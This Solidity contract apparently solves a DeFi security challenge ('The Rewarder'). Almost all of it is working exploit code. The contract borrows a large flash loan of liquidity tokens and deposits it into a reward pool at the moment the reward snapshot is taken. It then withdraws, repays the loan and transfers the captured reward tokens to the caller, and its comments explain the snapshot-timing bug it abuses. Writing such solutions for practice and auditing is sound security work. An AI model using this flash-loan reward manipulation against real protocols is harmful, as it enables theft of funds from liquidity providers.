// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function distributeRewards() external returns (uint256);

    function withdraw(uint256 amountToWithdraw) external;

    function deposit(uint256 amountToDeposit) external;

    function rewardToken() external view returns (address);

    function liquidityToken() external view returns (address);
}

interface IRewardToken is IERC20 {}

interface IDVT is IERC20 {}

contract RewarderAttacker {
    IFlashLoanerPool flashLoanerPool =
        IFlashLoanerPool(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
    IRewarderPool rewarderPool =
        IRewarderPool(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9);
    IRewardToken rewardToken = IRewardToken(rewarderPool.rewardToken());
    IDVT liquidityToken = IDVT(rewarderPool.liquidityToken());

    // We just loan the maximum amount of ether from the lender pool
    uint256 private constant FLASH_LOAN_AMOUNT = 1000000 ether;

    function exploit() public {
        // First, approve FLASH_LOAN_AMOUNT tokens for the rewarder pool to
        // spend on our behalf
        liquidityToken.approve(address(rewarderPool), FLASH_LOAN_AMOUNT);

        // Now, get the flash loan. This will call receiveFlashLoan() below
        flashLoanerPool.flashLoan(FLASH_LOAN_AMOUNT);

        // Transfer the rewardTokens to attacker
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256) public {
        // Once we have the flash loan, deposit it into the reward pool.
        // This calls distributeRewards(), which should give us back close to
        // 100 reward tokens.
        //
        // The bug here is that if an attacker waits long enough, they can
        // deposit their tokens and retrieve their rewards immediately, rather
        // than having to wait for 5 days. They just have to time their attack
        // right so that their call to deposit() triggers the snapshot to be
        // recorded. It's just an incorrect use of the snapshot feature.
        rewarderPool.deposit(FLASH_LOAN_AMOUNT);

        // Now we can just retrieve our DVT tokens back to repay the flash loan
        rewarderPool.withdraw(FLASH_LOAN_AMOUNT);
        liquidityToken.transfer(address(flashLoanerPool), FLASH_LOAN_AMOUNT);
    }
}
